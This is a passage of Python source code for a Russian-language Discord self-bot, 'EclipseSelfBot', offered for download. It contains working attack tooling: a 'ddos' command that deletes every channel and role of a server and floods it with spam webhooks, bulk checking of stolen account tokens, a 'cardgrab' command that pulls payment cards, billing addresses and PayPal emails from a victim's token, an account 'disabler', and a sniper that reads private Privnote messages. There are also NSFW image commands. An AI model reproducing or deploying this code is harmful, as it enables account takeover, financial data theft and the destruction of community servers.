⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣉⠀⣶⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠛⠿⠛
>```""")
    await asyncio.sleep(1)
    await message.edit(content="""```xml
<
⠀⠀⠀⣶⣿⣶
⠀⠀⠀⣿⣿⣿⣀
⠀⣀⣿⣿⣿⣿⣿⣿
⣶⣿⠛⣭⣿⣿⣿⣿
⠛⠛⠛⣿⣿⣿⣿⠿
⠀⠀⠀⠀⣿⣿⣿
⠀⠀⣀⣭⣿⣿⣿⣿⣀
⠀⠤⣿⣿⣿⣿⣿⣿⠉
⠀⣿⣿⣿⣿⣿⣿⠉
⣿⣿⣿⣿⣿⣿
⣿⣿⣶⣿⣿
⠉⠛⣿⣿⣶⣤
⠀⠀⠉⠿⣿⣿⣤
⠀⠀⣀⣤⣿⣿⣿
⠀⠒⠿⠛⠉⠿⣿
⠀⠀⠀⠀⠀⣀⣿⣿
⠀⠀⠀⠀⣶⠿⠿⠛

>```""")
    await asyncio.sleep(1)
    await message.edit(content=" ")
    
@bot.command()
async def fbi(ctx, *, user):
    await ctx.message.delete()
    msg=await ctx.send('> **knock knock**')
    await asyncio.sleep(2)
    await msg.edit(content='> **FBI OPEN UP**')
    await asyncio.sleep(2)
    reas=['fraud',
            'robbery',
            'murder',
            'unethical hacking',
            'drugs']
    await msg.edit(content=f'> {user} вы будете повязаны за {random.choices(reas)}')
    await asyncio.sleep(3)
    await msg.edit(content='> https://tenor.com/view/fbi-raid-swat-gif-11500735')
    
# Crash
global spam

spam = True


@bot.command()

async def spam(ctx, *, text=None):

	embederr = discord.Embed(

		title = 'Ошибка :x:',

		description = 'Укажите текст спама!',

		colour = discord.Colour.from_rgb(228,0,111)

	)

	embed = discord.Embed(

		title = 'Успешно :white_check_mark:',

		description = f'Спам запущен! Для остановки напишите {prefix}stop',

		colour = discord.Colour.from_rgb(228,0,111)

	)

	if text == None:

		await ctx.send(embed=embederr)

	else:

		global spam

		spam = True

		while spam:

			await ctx.send(text)

			


@bot.command()

async def stop(ctx):

	global spam

	spam = False

	await ctx.message.add_reaction('✅')

	
@bot.command()

async def ddos(ctx):

	await ctx.guild.edit(name='Crashed by Eclipse♡')

	for r in ctx.guild.roles:

		try:

			await r.delete()

		except:

			pass





	for c in ctx.guild.channels:

		try:

			await c.delete()

		except:

			pass



	for i in range(50):

		await ctx.guild.create_role(name='Crash By Eclipse♡')

		ch = await ctx.guild.create_text_channel('crashed-by-eclipse♡')

		await ch.create_webhook(name='Eclipse♡#0001')



@bot.event

async def on_guild_channel_create(channel):

	if channel.name == 'crashed-by-eclipse♡':

		for i in range(100):

			hooks = await channel.webhooks()

			for hook in hooks:

				await hook.send('''@everyone @here\n https://discord.gg/jgtYzaT4jy''', embed=discord.Embed(title='''EclipseSelfBot | Crashed''', description='''```xml\n< Данный сервак крашится селф-ботом EclipseSelfBot >```\n> `Если вы хотите зайти на серв и оскнуть нас что мы дауны тупые... Заткните рыло и молчите в тряпочку...`\n \n> `Вы сами виноваты в том что ваш сервер крашнули, выдавая администраторские права кому попало и добавляя неизвестных ботов...`\n**С любовью(Нет) Eclipse♡**\n[🔗Скачать селф бота](https://github.com/Eclipse0001/EclipseSelfBot)\n[🔗Telegram](https://t.me/ethercon_softs)\n[🔗Донат](https://www.qiwi.com/n/THEARTEMII)\n[🔗DiscordServer](https://discord.gg/jgtYzaT4jy)'''))
				
# Info	
@bot.command()
async def install(ctx):
	await ctx.send(f'```xml\n< EclipseSelfBot | Установка >```\n```xml\n< Мы можете установить селф бота по ссылке ниже: >```\n> https://github.com/Eclipse0001/EclipseSelfBot')
	
@bot.command()
async def website(ctx):
	webbrowser.open('https://github.com/Eclipse0001/EclipseSelfBot')
	
@bot.command()
async def ping(ctx):
    await ctx.send(f"```xml\n< Текущий пинг селфбота: {int(ctx.bot.ws.latency * 1000)}ms >```")

@bot.command()
async def ipinfo(ctx, ip):
	r = requests.get(f"http://ip-api.com/json/{ip}").json()
	await ctx.send(f'```xml\n< Информация о IP - Адресе {ip} >```\n```xml\n< Cоuntry code:{r[str("countryCode")]} >\n< Country: {r[str("country")]} >\n< City: {r[str("city")]}  >\n< Timezone: {r[str("timezone")]} >\n< ISP:** {r[str("isp")]} >```')
				
@bot.command()
async def avatar(ctx, *, user: discord.Member = None):  # b'\xfc'
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))

# Nsfw
@bot.command()
async def anal(ctx):
    await ctx.message.delete()
    r=requests.get("https://nekos.life/api/v2/img/anal")
    res=r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image=await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"anal.gif"))
    except:
        em=discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@bot.command()
async def tits(ctx):
    await ctx.message.delete()
    r=requests.get("https://nekos.life/api/v2/img/tits")
    res=r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image=await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"tits.gif"))
    except:
        em=discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@bot.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r=requests.get("https://nekos.life/api/v2/img/blowjob")
    res=r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image=await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"blowjob.gif"))
    except:
        em=discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        
@bot.command()
async def cum(ctx):
    await ctx.message.delete()
    r=requests.get("https://nekos.life/api/v2/img/cum")
    res=r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image=await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"cumslut.gif"))
    except:
        em=discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@bot.command()
async def lesbian(ctx):
    await ctx.message.delete()
    r=requests.get("https://nekos.life/api/v2/img/les")
    res=r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image=await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"lesbian.gif"))
    except:
        em=discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        
# Token
def th(token): return {'Authorization': token}

@bot.command()
async def tokeninfo(ctx, token):
    headers = th(token)
    r1 = rq.get('https://discord.com/api/users/@me', headers=headers)
    code = r1.status_code
    if code == 401:
        await ctx.send(f'Данный токен** \n `{token}` __*является*__ \n ```инвалидным```')
        return
    elif code == 200:
        pass
    else:
        await ctx.send('Неверный статус ответа Discord!', f'{code} {r1.text}')
        return
    j = r1.json()
    r2 = rq.get('https://discord.com/api/users/@me/guilds?with_counts=true', headers=headers)
    if r2.status_code == 200:
        pass
    elif r2.status_code == 403:
        await ctx.send("`Аккаунт не подтверждён(дискорд требует почту/телефон). Операции с данным аккаунтом не возможны!`")
        return
    else:
        await ctx.send(f'{r2.status_code} {r2.text}')
        return
    guilds = len(r2.json())
    bl = 0
    fr = 0
    i_r = 0
    o_r = 0
    r3 = rq.get('https://discord.com/api/users/@me/relationships', headers=headers)
    for rel in r3.json():
        t = rel['type']
        if t == 1:
            fr += 1
        elif t == 2:
            bl += 1
        elif t == 3:
            i_r += 1
        elif t == 4:
            o_r += 1
    tag = j['discriminator']
    nick = j['username']
    id = j['id']
    try:
        email = j['email']
    except:
        email = 'нету'
    try:
        phone = j['phone']
    except:
        phone = 'нету'
    try:
        mfa = j['mfa_enabled']
    except:
        mfa = False
    try:
        avatar = f'https://cdn.discordapp.com/avatars/{id}/{j["avatar"]}.png'
    except:
        avatar = 'нету'
    try:
        if j['premium_type'] == 2:
            nitro = 'Nitro Boost'
        elif j['premium_type'] == 1:
            nitro = 'Nitro Classic'
    except:
        nitro = 'нету'
    try:
        locale = j['locale']
    except:
        locale = 'неизвестно'
    r4 = rq.get('https://discord.com/api/users/@me/channels', headers=headers)
    dms = len(r4.json())
    await ctx.send(f'```xml\n< Информация о токене >```\n```xml\n< Никнейм: {nick}#{tag} >\n< ID: {id} >\n< Nitro: {nitro} >\n< Серверов: {guilds} >\n< Открытых лс: {dms} >\n< E-MAIL: {email} >\n< Номер телефона: {phone} >\n< 2FA: {"включено" if mfa else "выключено"} >\n< Друзья: {fr} >\n< ЧС: {bl} >\n< Входящих запросов: {i_r} >\n< Исходящих запросов: {o_r} >```')
    
@bot.command()
async def checktoken(ctx, select=None, token=None):
    if select == None:
        await ctx.send('`Укажи one/all`')
    if select == 'one':
        headers = {'Authorization': token}
        request = requests.get('https://canary.discord.com/api/v8/users/@me/library', headers=headers)
        if request.status_code == 403:
            await ctx.send(f'```xml\n< ♿ >```\n```xml\n< Данный токен >\n< {token} является >\n<Валид, но. Аккаунт не подтверждён(дискорд требует почту/телефон). Операции с данным аккаунтом не возможны!>```')
        elif request.status_code == 401:
            await ctx.send(f'```xml\n< ❌ >```\n```xml\n< Данный токен >\n< {token} является >\n<Инвалидом>```')
        else:
            await ctx.send(f'```xml\n< ✅ >```\n```xml\n< Данный токен >\n< {token} является\n<Валидом>```')
        await ctx.message.add_reaction("✅")
    if select == 'all':
        validTokens = []
        with open('tokens.txt','r') as handle:
            tokens = handle.readlines()
            for x in tokens:
                token = x.rstrip()
                headers = {'Authorization': token}
                request = requests.get('https://canary.discord.com/api/v8/users/@me/library', headers=headers)
                if request.status_code == 403:
                    await ctx.send(f'```xml\n< ♿ >```\n```xml\n< Данный токен >\n< {token} является >\n<Валид, но. Аккаунт не подтверждён(дискорд требует почту/телефон). Операции с данным аккаунтом не возможны!>```')
                elif request.status_code == 401:
                    await ctx.send(f'```xml\n< ❌ >```\n```xml\n< Данный токен >\n< {token} является >\n<Инвалидом>```')
                else:
                    await ctx.send(f'```xml\n< ✅ >```\n```xml\n< Данный токен >\n< {token} является\n<Валидом>```')
                    validTokens.append(token)
        tokens = open('tokens.txt', 'w')
        for token in validTokens:
            tokens.write(f'{token}\n')
        await ctx.send('`✅Все токены отфильтрованы`')
        await ctx.message.add_reaction("✅")
    
@bot.command()
async def cardgrab(ctx, token):
    cc_digits = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5'
    }
    grab1 = []
    headers = {'Authorization': token}
    for grab in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
        grab1 = grab['billing_address']
        name = grab1['name']
        address1 = grab1['line_1']
        address2 = grab1['line_2']
        city = grab1['city']
        postalСode = grab1['postal_code']
        state = grab1['state']
        country = grab1['country']
        if grab['type'] == 1:
            cc_brand = grab['brand']
            cc_first = cc_digits.get(cc_brand)
            cc_last = grab['last_4']
            cc_month = str(grab['expires_month'])
            cc_year = str(grab['expires_year'])
            await ctx.send(f'```xml\n< Payment Type: Credit card >```\n```xml\n< Valid: {not grab["invalid"]} >\n< CC Holder Name: {name} >\n< CC Brand: {cc_brand.title()} >\n< CC Number: {"".join(z if (i + 1) % 2 else z + " " for i, z in enumerate((cc_first if cc_first else "*") + ("*" * 11) + cc_last))} >\n< CC Date: {("0" + cc_month if len(cc_month) < 2 else cc_month) + "/" + cc_year[2:4]} >\n< Address 1: {address1} >\n< Address 2: {address2 if address2 else ""} >\n< City: {city} >\n< Postal code: {postalСode} >\n< State: {state if state else ""} >\n< Country: {country} >\n< Default Payment Method: {grab["default"]} >```')
        elif grab['type'] == 2:
            await ctx.send(f'```xml\n< Payment Type: PayPal >```\n```xml\n< Valid: {not grab["invalid"]} >\n<PayPal Name: {name} >\n< PayPal Email: {grab["email"]} >\n< Address 1: {address1} >\n< City: {city} >\n< Postal code: {postalСode} >\n< State: {state if state else ""} >\n< Country: {country} >\n< Default Payment Method: {grab["default"]} >```')


@bot.command()
async def disabler(ctx, _token):
    try:

        api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw")
        data = api.json()
        check = requests.get("https://discordapp.com/api/v6/guilds/" +
                             data['guild']['id'], headers={"Authorization": _token})
        stuff = check.json()
        requests.post("https://discordapp.com/api/v6/invite/hwcVZQw",
                      headers={"Authorization": _token})
        requests.delete("https://discordapp.com/api/v6/guiilds" +
                        data['guild']['id'], headers={"Authorization": _token})
        await ctx.send(f'*Успех*, {error553}')
        error553 = f'''
```css
[ Учётная запись успешно отключена. ]
```
'''  
    except:
        await ctx.send('*Ошибка!*, {error55}')
        error55 = f'''
```css
[ Что-то пошло не так. ]
```
'''
# Settings
nitro_sniper = True
giveaway_sniper = True

@bot.event
async def on_message(message):
	await bot.process_commands(message)
	def GiveawayData():
		print(
            f"{Fore.RESET} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.RESET} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

	def SlotBotData():
		print(
            f"{Fore.RESET} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.RESET} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

	def NitroData(elapsed, code):
		print(
            f"{Fore.RESET} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.RESET} - SERVER: {Fore.YELLOW}[{message.guild}]"
            f"\n{Fore.RESET} - AUTHOR: {Fore.YELLOW}[{message.author}]"
            f"\n{Fore.RESET} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
            f"\n{Fore.RESET} - CODE: {Fore.YELLOW}{code}"
            + Fore.RESET)

	def PrivnoteData(code):
		print(
            f"{Fore.RESET} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.RESET} - SERVER: {Fore.YELLOW}[{message.guild}]"
            f"\n{Fore.RESET} - CONTENT: {Fore.YELLOW}[The content can be found at Privnote/{code}.txt]"
            + Fore.RESET)

	time = datetime.now().strftime("%H:%M %p")
	if 'discord.gift/' in message.content:
		if nitro_sniper == True:
			start = datetime.now()
			code = re.search("discord.gift/(.*)", message.content).group(1)
			token = 'token'

			headers = {'Authorization': token}

			r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
			).text

			elapsed = datetime.now() - start
			elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

			if 'This gift has been redeemed already.' in r:
				print(""
					f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]"+Fore.RESET)
				NitroData(elapsed, code)

			elif 'subscription_plan' in r:
				print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Success]"+Fore.RESET)
				NitroData(elapsed, code)


			elif 'Unknown Gift Code' in r:
				print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]"+Fore.RESET)
				NitroData(elapsed, code)
		else:
			return

	if 'Someone just dropped' in message.content:
		if slotbot_sniper == True:
			if message.author.id == 346353957029019648:
				try:
					await message.channel.send('~grab')
				except discord.errors.Forbidden:
					print(""
                          f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]"+Fore.RESET)
				SlotBotData()
				print(""
                      f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]"+Fore.RESET)
				SlotBotData()
		else:
			return

	if 'GIVEAWAY' in message.content:
		if giveaway_sniper == True:
			if message.author.id == 294882584201003009:
				try:
					await message.add_reaction("🎉")
				except discord.errors.Forbidden:
					print(""
						f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]"+Fore.RESET)
					GiveawayData()
				print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Sniped]"+Fore.RESET)
				GiveawayData()
	else:
			return

	if f'Congratulations <@{bot.user.id}>' in message.content:
		if giveaway_sniper == True:
			if message.author.id == 294882584201003009:
				print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Won]"+Fore.RESET)
				GiveawayData()
		else:
			return

	if 'privnote.com' in message.content:
		if privnote_sniper == True:
			code = re.search('privnote.com/(.*)', message.content).group(1)
			link = 'https://privnote.com/'+code
			try:
				note_text = pn.read_note(link)
			except Exception as e:
				print(e)
			with open(f'Privnote/{code}.txt', 'a+') as f:
				print(""
						f"\n{Fore.CYAN}[{time} - Privnote Sniped]"+Fore.RESET)
				PrivnoteData(code)
				f.write(note_text)
		else:
			return
			
@bot.event
async def on_command_error(ctx, error):
    error_str=str(error)
    error=getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(
            f"{Fore.RED}[ERROR]: {Fore.YELLOW}You're missing permission to execute this command"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(
            f"{Fore.RED}[ERROR]: {Fore.YELLOW}Missing arguments: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Not a valid image"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(
            f"{Fore.RED}[ERROR]: {Fore.YELLOW}Discord error: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(
            f"{Fore.RED}[ERROR]: {Fore.YELLOW}Couldnt send a empty message"+Fore.RESET)
    else:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{error_str}"+Fore.RESET)
        
@bot.event
async def on_command(ctx):
	print(f"{Fore.RESET}{gettime()}  |  {Fore.LIGHTRED_EX}[Command]{Fore.RESET}  |  {ctx.prefix}{ctx.command}")

try:
	bot.run(token, bot = False)
except KeyboardInterrupt:
	print(f"{Fore.RESET}{gettime()}  |  {Fore.LIGHTRED_EX}[Exit]  {Fore.RESET}|  {Fore.LIGHTRED_EX}Quitting...")
